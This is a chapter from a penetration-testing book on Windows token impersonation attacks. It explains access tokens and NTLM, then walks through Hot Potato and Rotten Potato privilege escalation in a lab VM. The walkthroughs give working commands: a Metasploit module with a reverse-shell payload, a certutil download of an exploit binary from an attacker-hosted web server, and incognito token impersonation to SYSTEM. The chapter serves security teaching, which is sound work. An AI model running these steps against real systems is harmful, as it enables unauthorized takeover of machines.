<html><head></head><body><div id="sbo-rt-content"><div id="_idContainer160">
			<h1 id="_idParaDest-86"><em class="italic"><a id="_idTextAnchor089"/>Chapter 6</em>: Impersonation Attacks</h1>
			<p>Now that you have got your hands dirty with the privilege escalation process on Windows, we can begin exploring other attack vectors that can be exploited to elevate our privileges. In this chapter, we will be taking a closer look at <strong class="bold">Windows access tokens</strong>, how they work, and how they can be leveraged to elevate our privileges through impersonation attacks.</p>
			<p>The practical demonstrations in this chapter will primarily be focused on how to enumerate privileges on a system to determine whether it is vulnerable to impersonation attacks and how to generate or impersonate a privileged Windows access token that can be used to elevate our privileges. </p>
			<p>We will also look at how to use various built-in <strong class="source-inline">meterpreter</strong> modules to automate the token impersonation process on a target system.</p>
			<p>In this chapter, we're going to cover the following main topics:</p>
			<ul>
				<li>Understanding Windows access tokens</li>
				<li>Enumerating privileges</li>
				<li>Token impersonation attacks</li>
				<li>Escalating privileges via a Potato attack </li>
			</ul>
			<h1 id="_idParaDest-87"><a id="_idTextAnchor090"/>Technical requirements </h1>
			<p>To follow along with the demonstrations in this chapter, you will need to ensure that you meet the following technical requirements:</p>
			<ul>
				<li>Familiarity with Windows CMD commands</li>
				<li>Basic understanding of Windows access tokens</li>
			</ul>
			<p>You can view this chapter's code in action here: <a href="https://bit.ly/3kWPSch">https://bit.ly/3kWPSch</a></p>
			<h1 id="_idParaDest-88"><a id="_idTextAnchor091"/>Understanding Windows access tokens</h1>
			<p>We took a <a id="_idIndexMarker348"/>brief look at how Windows access tokens work in the first chapter of the book and should have a general idea of how they can be abused to elevate privileges. This section will dive deeper into how they work and their role in the authentication process on Windows.</p>
			<p>The first step is to revisit the function Windows access tokens play in authentication, how they work, and the various security levels that can be assigned to tokens.</p>
			<h2 id="_idParaDest-89"><a id="_idTextAnchor092"/>Windows access tokens</h2>
			<p>Windows <a id="_idIndexMarker349"/>access tokens are a core element of the authentication<a id="_idIndexMarker350"/> process on Windows and are created and managed by the <strong class="bold">Local Security Authority Subsystem Service</strong> (<strong class="bold">LSASS</strong>).</p>
			<p>A Windows access token is responsible for identifying and describing the security context of a process or thread running on a system. Simply put, an access token can be thought of as a temporary key akin to a web cookie that provides users with access to a system or network without having to provide credentials each time a process is started or a system resource is accessed.</p>
			<p>Access tokens are generated by the <strong class="source-inline">winlogon.exe</strong> process every time a user authenticates successfully and includes the identity and privileges of the user account associated with the thread or process. This token is then attached to the <strong class="source-inline">userinit.exe</strong> process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token.</p>
			<h2 id="_idParaDest-90"><a id="_idTextAnchor093"/>Token security levels</h2>
			<p>Given the<a id="_idIndexMarker351"/> fact that access tokens are used to provide specific access to users based on their privileges, Windows access tokens are categorized based on the varying security levels assigned to them. These security levels are used to determine the privileges that are assigned to a specific token. </p>
			<p>An access token will typically be assigned one of the following security levels:</p>
			<ul>
				<li>Anonymous</li>
				<li>Identify</li>
				<li>Impersonate</li>
				<li>Delegate</li>
			</ul>
			<p>The two main security <a id="_idIndexMarker352"/>levels we will be encountering and leveraging are <strong class="bold">impersonate</strong> and <strong class="bold">delegate</strong> as they can be abused to elevate our privileges on a system.</p>
			<h3>Impersonate tokens</h3>
			<p><strong class="bold">Impersonate</strong>-level <a id="_idIndexMarker353"/>tokens<a id="_idIndexMarker354"/> are created as a direct result of a non-interactive login on Windows, typically through specific system services or domain logons. </p>
			<p><strong class="bold">Impersonate</strong>-level tokens can be used to impersonate a token on the local system and not on any external systems that utilize the token. </p>
			<h3>Delegate tokens</h3>
			<p><strong class="bold">Delegate</strong>-level<a id="_idIndexMarker355"/> tokens<a id="_idIndexMarker356"/> are typically created through an interactive login on Windows, primarily through a traditional login or through remote access protocols such <a id="_idIndexMarker357"/>as <strong class="bold">Remote Desktop Protocol</strong> (<strong class="bold">RDP</strong>).</p>
			<p><strong class="bold">Delegate</strong>-level tokens pose the largest threat as they can be used to impersonate tokens on any system.</p>
			<p>Now that we have an idea of how access tokens work and the various security levels associated with them, we can look at how they are abused to elevate privileges on a system.</p>
			<h2 id="_idParaDest-91"><a id="_idTextAnchor094"/>Abusing tokens </h2>
			<p>The process of abusing <a id="_idIndexMarker358"/>tokens to elevate privileges on a system will primarily depend on the privileges assigned to the account that has been exploited to gain initial access. </p>
			<p>In order to fully understand how to leverage the delegate and impersonate access tokens to elevate our privileges, we will need to explore the specific Windows privileges that are required to perform an impersonation attack. </p>
			<p>The following are the privileges that are required for a successful impersonation attack:</p>
			<ul>
				<li><strong class="source-inline">SeAssignPrimaryToken</strong>: This allows a user to impersonate tokens using exploit tools such as <strong class="source-inline">rottenpotato.exe</strong>.</li>
				<li><strong class="source-inline">SeCreateToken</strong>: This allows a user to create an arbitrary token with administrative privileges.</li>
				<li><strong class="source-inline">SeImpersonatePrivilege</strong>: This allows a user to create a process under the security context of another user typically with administrative privileges.</li>
			</ul>
			<p>More information regarding the specific Windows privileges and their potential impact in terms of impersonation attacks can be found here: <a href="https://github.com/gtworek/Priv2Admin">https://github.com/gtworek/Priv2Admin.</a></p>
			<p>Now that we understand how access tokens work on Windows, the various security levels associated <a id="_idIndexMarker359"/>with tokens, and the specific privileges required to launch a successful impersonation attack, we can begin the token impersonation process by taking a look at how to enumerate the privileges associated with our account on the target system.</p>
			<p>In this chapter, we will be using Windows 7 SP1 virtual machine that we had set up in our virtual hacking lab.</p>
			<p>We can now begin the process of enumerating privileges in order to determine whether we can perform an impersonation attack on the target. </p>
			<h1 id="_idParaDest-92"><a id="_idTextAnchor095"/>Enumerating privileges</h1>
			<p>To perform the <a id="_idIndexMarker360"/>privilege enumeration process, you will need to ensure that you have access to your target system either through a command shell or a <strong class="source-inline">meterpreter</strong> session. We will be taking a look at how to use various techniques that will apply to both methods of access. To begin the privilege enumeration process, follow the outlined procedures:</p>
			<ol>
				<li>The first step is to identify the user account you are currently utilizing. This can be done by running the following command in <strong class="source-inline">meterpreter</strong>:<p class="source-code"><strong class="bold">getuid</strong></p><p>If you do not have access to the target via a <strong class="source-inline">meterpreter</strong> session, you can run the following command in the command shell:</p><p class="source-code"><strong class="bold">whoami</strong></p><p>As highlighted in the following screenshot, this will output the current user you are logged<a id="_idIndexMarker361"/> in as; in this case, we are logged in as a regular user:</p><div id="_idContainer139" class="IMG---Figure"><img src="Images/B17389_06_001.jpg" alt="Figure 6.1 – Enumerating current user&#13;&#10;" width="648" height="303"/></div><p class="figure-caption">Figure 6.1 – Enumerating current user</p></li>
				<li>The next step involves enumerating the user privileges, this can be done by running the following command in <strong class="source-inline">meterpreter</strong>:<p class="source-code"><strong class="bold">getprivs</strong></p><p>Alternatively, if you are utilizing a command shell, you can run the following Windows command in the command prompt:</p><p class="source-code"><strong class="bold">whoami /priv</strong></p></li>
			</ol>
			<p>This will output a list of privileges assigned to the user account. We are primarily interested in identifying the following privileges that can be abused:</p>
			<ul>
				<li><strong class="source-inline">SeAssignPrimaryToken</strong>: This allows a user to impersonate tokens using exploit tools such as <strong class="source-inline">rottenpotato.exe</strong>.</li>
				<li><strong class="source-inline">SeCreateToken</strong>: This allows a user to create an arbitrary token with administrative privileges. </li>
				<li><strong class="source-inline">SeImpersonatePrivilege</strong>: This allows a user to create a process under the security <a id="_idIndexMarker362"/>context of another user typically with administrative privileges:</li>
			</ul>
			<div>
				<div id="_idContainer140" class="IMG---Figure">
					<img src="Images/B17389_06_002.jpg" alt="Figure 6.2 – Enumerating privileges with meterpreter&#13;&#10;" width="338" height="220"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.2 – Enumerating privileges with meterpreter</p>
			<p>As highlighted in the preceding screenshot, we are able to identify the <strong class="source-inline">SeImpersonatePrivilege</strong> privilege. This privilege can be used to create a process under the security context of another user typically with administrative privileges:</p>
			<div>
				<div id="_idContainer141" class="IMG---Figure">
					<img src="Images/B17389_06_003.jpg" alt="Figure 6.3 – Enumerating privileges CMD&#13;&#10;" width="998" height="184"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.3 – Enumerating privileges CMD</p>
			<p>As highlighted in the preceding screenshot, the Windows command will also provide information regarding the privilege; in this case, the <strong class="source-inline">SeImpersonatePrivilege</strong> privilege allows us to impersonate a client after authentication. </p>
			<p>If the account does not have any of the privileges outlined here, you will not be able to perform an impersonation attack successfully. As a result, you will need to identify another potential attack vector.</p>
			<p>We have now<a id="_idIndexMarker363"/> been able to successfully enumerate the privileges of the user account we are logged in as and can begin performing the token impersonation attack.</p>
			<h1 id="_idParaDest-93"><a id="_idTextAnchor096"/>Token impersonation attacks</h1>
			<p>Token<a id="_idIndexMarker364"/> impersonation attacks leverage specific Windows privileges such as <strong class="source-inline">SeImpersonatePrivilege</strong> to obtain an access token with administrative privileges that we can use to impersonate in order to elevate our privileges. </p>
			<p>This process will depend on the version of Windows you are targeting and can be performed through various techniques.</p>
			<p>The technique we will be focusing on is<a id="_idIndexMarker365"/> known as the <strong class="bold">Potato attack</strong>. This attack has some variations that alter the exploitation process; however, the core principles of the exploitation process remain the same. To fully understand how to successfully impersonate tokens, we will need to take a closer look at how the Potato attack works.</p>
			<h2 id="_idParaDest-94"><a id="_idTextAnchor097"/>Potato attacks overview</h2>
			<p>The Potato <a id="_idIndexMarker366"/>attack is the name given to a Windows privilege escalation technique that exploits known issues in Windows such as the <em class="italic">NTLM relay</em> (specifically <a id="_idIndexMarker367"/>the HTTP – SMB relay), <strong class="bold">NetBIOS Name Service</strong> (<strong class="bold">NBNS</strong>) <em class="italic">spoofing</em>, <em class="italic">WPAD</em>, and <em class="italic">Windows Update</em>.</p>
			<p>This technique allows attackers to elevate privileges on a Windows system from an account with the lowest privileges to an account with the highest privilege available, namely <strong class="source-inline">NT AUTHORITY</strong>/<strong class="source-inline">SYSTEM</strong>. </p>
			<p>Because the exploitation process involves leveraging NTLM authentication, we need to get an <a id="_idIndexMarker368"/>understanding of how NTLM authentication works.</p>
			<h3>NTLM authentication</h3>
			<p><strong class="bold">NT LAN Manager</strong> (<strong class="bold">NTLM</strong>) is a<a id="_idIndexMarker369"/> collection of authentication<a id="_idIndexMarker370"/> protocols utilized in Windows to facilitate authentication between computers. The authentication process involves the use of a valid username and password to authenticate successfully.</p>
			<p>NTLM authentication operates under the client-server model of communication and involves a handshake<a id="_idIndexMarker371"/> process similar to the <strong class="bold">TCP 3-way handshake</strong>.</p>
			<p>The authentication process utilizes three types of messages that are used to establish successful authentication:</p>
			<ul>
				<li>Negotiation</li>
				<li>Challenge</li>
				<li>Response </li>
			</ul>
			<p>The following figure illustrates the NTLM authentication process as a whole and the handshake process between the client and the server:</p>
			<div>
				<div id="_idContainer142" class="IMG---Figure">
					<img src="Images/B17389_06_004.jpg" alt="Figure 6.4 – NTLM authentication process&#13;&#10;" width="763" height="358"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.4 – NTLM authentication process</p>
			<p>Now that we have a basic idea of how NTLM authentication works, let's explore the steps involved in the handshake process in greater detail:</p>
			<ol>
				<li value="1">The client initiates the connection by sending an authentication request to the server; the authentication request includes a username for authentication.</li>
				<li>The server responds to the request with an NTLM challenge, typically a random number.</li>
				<li>The client receives the challenge response and generates a hash of the challenge<a id="_idIndexMarker372"/> number and the user's password and sends it back to the server.</li>
				<li>The server already knows the user's password and generates a hash of the password to compare it to the hash that was sent back by the client.</li>
				<li>If the hashes match, the authenticity of the client and consequently the user is verified and access is granted; if there is a mismatch, access will be denied.</li>
			</ol>
			<p>The nature of the NTLM authentication handshake makes it vulnerable to <strong class="bold">man-in-the-middle attacks</strong>, which<a id="_idIndexMarker373"/> can be used to perform impersonation attacks.</p>
			<p>You should now have an understanding of how NTLM authentication works, and we can now explore the various variations of the Potato attack that can be used. </p>
			<h3>Hot Potato attack</h3>
			<p>The Hot Potato<a id="_idIndexMarker374"/> attack involves various steps that leverage the NTLM relay (specifically the HTTP=&gt;SMB relay), WPAD, NetBIOS name server, spoofing, and Windows Update. The attack works as follows: </p>
			<ol>
				<li value="1">The first step involves flooding the target with fake NBNS response packets for our fake WPAD proxy server that we will set up on <strong class="source-inline">127.0.0.1:80</strong>. This will redirect HTTP traffic on the target system to our server.</li>
				<li>The next step involves starting Windows Update as <strong class="source-inline">NT AUTHORITY</strong>/<strong class="source-inline">SYSTEM</strong>.</li>
				<li>By default, Windows Update will automatically find the network proxy setting configuration by requesting the URL <strong class="source-inline">http://wpad/wpad.dat&amp;#8221</strong>. This is where the fake WPAD proxy server comes in place. If a proxy exists, it will be used. Given that we have flooded our target with packets containing the address of our fake proxy, Windows Update will use the fake proxy, therefore allowing us to intercept the privileged NTLM authentication requests.</li>
				<li>The fake WPAD proxy authenticates via the NTLM SMB relay and obtains the NTLM security challenge. The security challenge is then forwarded to Windows Update.</li>
				<li>Windows Update<a id="_idIndexMarker375"/> sends back the NTLM response, which will be intercepted by the fake WPAD proxy.</li>
				<li>The final step involves using the NTLM response for authentication via SMB.</li>
			</ol>
			<p>More information<a id="_idIndexMarker376"/> regarding the Hot Potato attack can be found here: <a href="https://foxglovesecurity.com/2016/01/16/hot-potato/">https://foxglovesecurity.com/2016/01/16/hot-potato/</a> </p>
			<h3>Rotten Potato attack</h3>
			<p>The Rotten <a id="_idIndexMarker377"/>Potato attack involves three main steps that leverage the NTLM relay to negotiate a security token for <strong class="source-inline">NT AUTHORITY</strong>/<strong class="source-inline">SYSTEM</strong>. The attack works as follows:</p>
			<ol>
				<li value="1">The first step involves tricking an <strong class="source-inline">NT AUTHORITY</strong>/<strong class="source-inline">SYSTEM</strong> account into authenticating via NTLM using a TCP endpoint that we operate.</li>
				<li>The authentication process can be facilitated by setting up a man-in-the-middle attack to locally negotiate a security token from an <strong class="source-inline">NT AUTHORITY</strong>/<strong class="source-inline">SYSTEM</strong> account. </li>
				<li>The final step involves impersonating the token we have just negotiated. This requires our account to have the <strong class="source-inline">SeImpersonatePrivilege</strong> privilege. </li>
			</ol>
			<p>The Rotten Potato attack is an improved variation of the Hot Potato attack, which also leverages the NTLM relay, NBNS spoofing, WPAD, and Windows Update. The Rotten Potato attack is much more efficient and provides a greater degree of success as it does not rely on the <a id="_idIndexMarker378"/>Windows Update process.</p>
			<p>More information <a id="_idIndexMarker379"/>regarding the Rotten Potato attack can be found here: <a href="https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/">https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/.</a></p>
			<p>Now that we understand how the various Potato attacks work, we can begin the token impersonation process on our target system.</p>
			<h1 id="_idParaDest-95"><a id="_idTextAnchor098"/>Escalating privileges via a Potato attack</h1>
			<p>In this section, we<a id="_idIndexMarker380"/> will be exploring the various tools and techniques that can be utilized to perform token impersonation via the Potato attack. As mentioned in the previous section, the success of Potato attacks will depend on the version of Windows the target is running and whether services such as WPAD are running or if NTLMv2 hashes are being used.</p>
			<p>We can begin the process by following the outlined procedures:</p>
			<ol>
				<li value="1">The first step involves performing system enumeration to identify any potential privilege escalation vectors that can be exploited through the Potato attack. This can be done using an automated enumeration script; in this case, we will utilize the <em class="italic">Windows exploit suggester</em> script:<p class="source-code"><strong class="bold">./windows-exploit-suggester.py --database &lt;Database&gt;.xlsx --systeminfo &lt;Systeminfo&gt;.txt</strong></p><p>As highlighted in the following screenshot, this will output a list of potential privilege escalation vulnerabilities, in this case, we are only interested in Potato exploits that can lead to privilege escalation:</p><div id="_idContainer143" class="IMG---Figure"><img src="Images/B17389_06_005.jpg" alt="Figure 6.5 – Windows exploit suggester results &#13;&#10;" width="1331" height="143"/></div><p class="figure-caption">Figure 6.5 – Windows exploit suggester results </p><p>In this example, we can identify a potential privilege escalation attack vector that can be exploited through the Hot Potato and Rotten Potato attacks: </p><div id="_idContainer144" class="IMG---Figure"><img src="Images/B17389_06_006.jpg" alt="Figure 6.6 – MS16-075 Metasploit module&#13;&#10;" width="652" height="407"/></div><p class="figure-caption">Figure 6.6 – MS16-075 Metasploit module</p><p>As shown<a id="_idIndexMarker381"/> in the preceding screenshot, additional research regarding the <strong class="bold">MS16-075</strong> exploit reveals a Metasploit module that we can use to perform the Potato attack automatically.</p></li>
				<li>We can load the module in Metasploit by running the following command:<p class="source-code"><strong class="bold">use exploit/windows/local/ms16_075_reflection</strong></p><p>Ensure that you have put your <strong class="source-inline">meterpreter</strong> session in the background before loading the module.</p></li>
				<li>After loading the module, we can explore the module options by running the following command in the Metasploit console:<p class="source-code"><strong class="bold">show options</strong></p><p>You will also need to specify the default shell to be used; in this case, we will be utilizing a <strong class="source-inline">meterpreter</strong> shell compatible with <strong class="source-inline">x64</strong>-based operating systems. This can be done by running the following command:</p><p class="source-code"><strong class="bold">set payload /windows/x64/meterpreter/reverse_tcp </strong></p><p>As highlighted in the following screenshot, the module options you will need to modify are <strong class="source-inline">LHOST</strong>, <strong class="source-inline">LPORT</strong>, and the <strong class="source-inline">SESSION</strong> ID. Additionally, the module options should<a id="_idIndexMarker382"/> also reflect the default shell we had specified in the previous step:</p><div id="_idContainer145" class="IMG---Figure"><img src="Images/B17389_06_007.jpg" alt="Figure 6.7 – Module options and default payload&#13;&#10;" width="1171" height="592"/></div><p class="figure-caption">Figure 6.7 – Module options and default payload</p></li>
				<li>After configuring the module options, we can run the exploit module by running the following command:<p class="source-code"><strong class="bold">run</strong></p><p>If the exploit is successful, you should get a new <strong class="source-inline">meterpreter</strong> session as highlighted in the following screenshot:</p><div id="_idContainer146" class="IMG---Figure"><img src="Images/B17389_06_008.jpg" alt="Figure 6.8 – Exploit successful" width="1197" height="366"/></div><p class="figure-caption">Figure 6.8 – Exploit successful </p></li>
				<li>The next step involves performing the impersonation process and can be automated using a built-in <strong class="source-inline">meterpreter</strong> module called <strong class="source-inline">incognito</strong>. The module can be loaded by running the following command:<p class="source-code"><strong class="bold">load incognito</strong></p><p>If the <a id="_idIndexMarker383"/>module is successfully loaded, you should get a message similar to the one highlighted in the following screenshot:</p><div id="_idContainer147" class="IMG---Figure"><img src="Images/B17389_06_009.jpg" alt="Figure 6.9 – Loading incognito&#13;&#10;" width="431" height="82"/></div><p class="figure-caption">Figure 6.9 – Loading incognito</p><p class="callout-heading">Note</p><p class="callout"><strong class="source-inline">incognito</strong> is a built-in <strong class="source-inline">meterpreter</strong> module that was originally a standalone application that allows you to impersonate user tokens after successful exploitation. </p></li>
				<li>We can now use <strong class="source-inline">incognito</strong> to display a list of tokens available that we can impersonate. This can be done by running the following command in <strong class="source-inline">meterpreter</strong>:<p class="source-code"><strong class="bold">list_tokens -u</strong></p><p>As highlighted in the following screenshot, this will list all available user tokens that we can impersonate to elevate our privileges. In this case, we are able to identify the <strong class="source-inline">NT AUTHORITY/SYSTEM</strong> access token with the delegate security level:</p><div id="_idContainer148" class="IMG---Figure"><img src="Images/B17389_06_010.jpg" alt="Figure 6.10 – Listing tokens" width="902" height="383"/></div><p class="figure-caption">Figure 6.10 – Listing tokens </p></li>
				<li>The next <a id="_idIndexMarker384"/>step involves the actual impersonation. This can be done through <strong class="source-inline">incognito</strong> by running the following command:<p class="source-code"><strong class="bold">impersonate_token "NT AUTHORITY\SYSTEM"</strong></p><p>If the impersonation process is successful, you should receive a message similar to the one highlighted in the following screenshot:</p><div id="_idContainer149" class="IMG---Figure"><img src="Images/B17389_06_011.jpg" alt="Figure 6.11 – Successful impersonation&#13;&#10;" width="872" height="153"/></div><p class="figure-caption">Figure 6.11 – Successful impersonation</p></li>
				<li>We can now verify the impersonation attack process by enumerating our current user and privileges. This can be done by running the following command in Meterpreter:<p class="source-code"><strong class="bold">getuid</strong></p><p>As highlighted in the following screenshot, we should now have <strong class="source-inline">NT AUTHORITY/SYSTEM</strong> privileges on the target system and should have successfully elevated our privileges:</p></li>
			</ol>
			<div>
				<div id="_idContainer150" class="IMG---Figure">
					<img src="Images/B17389_06_012.jpg" alt="Figure 6.12 – User enumeration&#13;&#10;" width="387" height="77"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.12 – User enumeration</p>
			<p>Now that we have<a id="_idIndexMarker385"/> learned how to perform impersonation attacks automatically using Metasploit modules, we can also explore how to perform Potato attacks manually.</p>
			<h2 id="_idParaDest-96"><a id="_idTextAnchor099"/>Manual escalation</h2>
			<p>The manual <a id="_idIndexMarker386"/>escalation process will entail the use of exploit binaries that require manual compilation, transfer, and execution. After executing the exploit binary, we will utilize <strong class="source-inline">meterpreter</strong> modules such as <strong class="source-inline">incognito</strong> to list the available tokens and impersonate a privileged access token to elevate our privileges:</p>
			<ol>
				<li value="1">Like the previous section, the first step involves performing system enumeration to identify any potential privilege escalation vectors that can be exploited through the Potato attack. This can be done using an automated enumeration script, in this case, we will utilize the <em class="italic">Windows exploit suggester</em> script: <p class="source-code"><strong class="bold">./windows-exploit-suggester.py --database &lt;Database&gt;.xlsx --systeminfo &lt;Systeminfo&gt;.txt</strong></p><p>As highlighted in the following screenshot, this will output a list of potential privilege escalation vulnerabilities. In this case, we are only interested in Potato exploits that can lead to privilege escalation:</p><div id="_idContainer151" class="IMG---Figure"><img src="Images/B17389_06_013.jpg" alt="Figure 6.13 – Windows exploit suggester results&#13;&#10;" width="1133" height="121"/></div><p class="figure-caption">Figure 6.13 – Windows exploit suggester results</p><p>In this example, we can identify a potential privilege escalation attack vector that can be exploited through a Rotten Potato attack. </p><p>We can<a id="_idIndexMarker387"/> navigate to the GitHub reference URL outlined in <em class="italic">Figure 6.13</em> to learn more about the exploit and how it can be used.</p><p>As highlighted in the following screenshot, the GitHub repository provides us with the exploit source code and a pre-compiled executable that we can use:</p><div id="_idContainer152" class="IMG---Figure"><img src="Images/B17389_06_014.jpg" alt="Figure 6.14 – RottenPotato GitHub repository" width="820" height="240"/></div><p class="figure-caption">Figure 6.14 – RottenPotato GitHub repository</p><p>The GitHub repository also provides us with usage procedures for the exploit and the requirements, as highlighted in the following screenshot:</p><div id="_idContainer153" class="IMG---Figure"><img src="Images/B17389_06_015.jpg" alt="Figure 6.15 – RottenPotato usage " width="798" height="231"/></div><p class="figure-caption">Figure 6.15 – RottenPotato usage </p><p>In this case, we will be using the pre-compiled executable; it is, however, recommended to analyze the source code and compile it manually to modify the parameters based on your requirements and avoid any security issues. </p></li>
				<li>After downloading<a id="_idIndexMarker388"/> the pre-compiled exploit, we will need to transfer it to the target system. To transfer the <strong class="source-inline">rottenpotato.exe</strong> binary to our target, we will need to set up a web server on our Kali virtual machine that will be used to host the binary so that we can download it on the target system. This can be done by following the procedures outlined here.<p>To set up a web server on our Kali virtual machine, we can utilize the <strong class="source-inline">SimpleHTTPServer</strong> Python module to serve the binary file. This can be done by running the following command in the directory where the <strong class="source-inline">rottenpotato.exe</strong> binary is stored:</p><p class="source-code"><strong class="bold">sudo python -m SimpleHTTPServer 80</strong></p><p>Alternatively, you can also utilize the Python3 <strong class="source-inline">http.server</strong> module by running the following command:</p><p class="source-code"><strong class="bold">sudo python3 -m http.server 80</strong></p><p>As highlighted in the following screenshot, <strong class="source-inline">SimpleHTTPServer</strong> will serve the files in the directory on the Kali virtual machine IP address on port <strong class="source-inline">80</strong>:</p><div id="_idContainer154" class="IMG---Figure"><img src="Images/B17389_06_016.jpg" alt="Figure 6.16 – SimpleHTTP server directory&#13;&#10;" width="895" height="231"/></div><p class="figure-caption">Figure 6.16 – SimpleHTTP server directory</p><p>To download the <strong class="source-inline">rottenpotato.exe</strong> binary onto the target system, we can utilize the <strong class="source-inline">certutil</strong> utility. Before we can download the binary, however, we need to navigate to a directory where we have read and write permissions. In this case, we will navigate to the current user's desktop as illustrated in the following<a id="_idIndexMarker389"/> screenshot: </p><div id="_idContainer155" class="IMG---Figure"><img src="Images/B17389_06_017.jpg" alt="Figure 6.17 – Default user directory" width="290" height="193"/></div><p class="figure-caption">Figure 6.17 – Default user directory</p><p>We can now use the <strong class="source-inline">certutil</strong> utility to download the binary from the Kali virtual machine to our target system. This can be done by running the following command on the target system:</p><p class="source-code"><strong class="bold">certutil -urlcache -f http://&lt;KALI-VM-IP&gt;/rottenpotato.exe rottenpotato.exe</strong></p><p>Alternatively, we can also use <strong class="source-inline">meterpreter</strong> to upload the <strong class="source-inline">rottenpotato.exe</strong> binary. This can be done by running the following command:</p><p class="source-code"><strong class="bold">upload /&lt;BINARY-LOCATION&gt;/rottenpotato.exe</strong></p></li>
				<li>The next step as per the usage procedures outlined is to load the <strong class="source-inline">incognito</strong> module in <strong class="source-inline">meterpreter</strong>. This can be done by running the following command:<p class="source-code"><strong class="bold">load incognito</strong></p></li>
				<li>After loading the <strong class="source-inline">incognito</strong> module, we can now execute the <strong class="source-inline">rottenpotato.exe</strong> binary. This can be done by launching a shell session in <strong class="source-inline">meterpreter</strong> by running the following command:<p class="source-code"><strong class="bold">shell</strong></p><p>After <a id="_idIndexMarker390"/>launching a shell session on the target, we can execute the <strong class="source-inline">rottenpotato.exe</strong> binary by running the following command:</p><p class="source-code"><strong class="bold">.\rottenpotato.exe</strong></p><p>If the exploit is successful, you should receive a message like the one highlighted in the following screenshot:</p><div id="_idContainer156" class="IMG---Figure"><img src="Images/B17389_06_018.jpg" alt="Figure 6.18 – RottenPotato exploit successful&#13;&#10;" width="464" height="193"/></div><p class="figure-caption">Figure 6.18 – RottenPotato exploit successful</p></li>
				<li>We can now terminate the shell session and return to the <strong class="source-inline">meterpreter</strong> session and list out the access tokens available for impersonation. This can be done by running the following command:<p class="source-code"><strong class="bold">list_tokens -u</strong></p><p>As highlighted in the following screenshot, this will list out all available user tokens that we can impersonate to elevate our privileges. In this case, we are able to identify the <strong class="source-inline">NT AUTHORITY/SYSTEM</strong> access token with the delegate security<a id="_idIndexMarker391"/> level:</p><div id="_idContainer157" class="IMG---Figure"><img src="Images/B17389_06_019.jpg" alt="Figure 6.19 – Listing tokens&#13;&#10;" width="932" height="396"/></div><p class="figure-caption">Figure 6.19 – Listing tokens</p></li>
				<li>The next step involves the actual impersonation. This can be done through <strong class="source-inline">incognito</strong> by running the following command:<p class="source-code"><strong class="bold">impersonate_token "NT AUTHORITY\SYSTEM" </strong></p><p>If the impersonation process is successful, you should receive a message like the one highlighted in the following screenshot:</p><div id="_idContainer158" class="IMG---Figure"><img src="Images/B17389_06_020.jpg" alt="Figure 6.20 – Successful impersonation&#13;&#10;" width="856" height="153"/></div><p class="figure-caption">Figure 6.20 – Successful impersonation</p></li>
				<li>We can now verify the impersonation attack process by enumerating our current user and privileges. This can be done by running the following command in Meterpreter:<p class="source-code"><strong class="bold">getuid</strong></p><p>As highlighted in the following screenshot, we should now have <strong class="source-inline">NT AUTHORITY/SYSTEM</strong> privileges on the target system and should have successfully elevated our privileges:</p></li>
			</ol>
			<div>
				<div id="_idContainer159" class="IMG---Figure">
					<img src="Images/B17389_06_021.jpg" alt="Figure 6.21 – User enumeration&#13;&#10;" width="364" height="77"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.21 – User enumeration</p>
			<p>We have now <a id="_idIndexMarker392"/>been able to elevate our privileges through token impersonation attacks both through Metasploit modules and manually through exploit binaries.</p>
			<h1 id="_idParaDest-97"><a id="_idTextAnchor100"/>Summary</h1>
			<p>In this chapter, we got started with understanding how Windows access tokens work and the various security levels associated with them. We then looked at how to enumerate privileges on our target system through the use of automated and manual tools in order to identify whether it is vulnerable to a token impersonation attack. We then ended the chapter by taking an in-depth look at how to perform token impersonation attacks via the Potato attack both automatically and manually.</p>
			<p>In the next chapter, we will look at how to search for stored credentials and hashes to elevate our privileges.</p>
		</div>
	</div></body></html>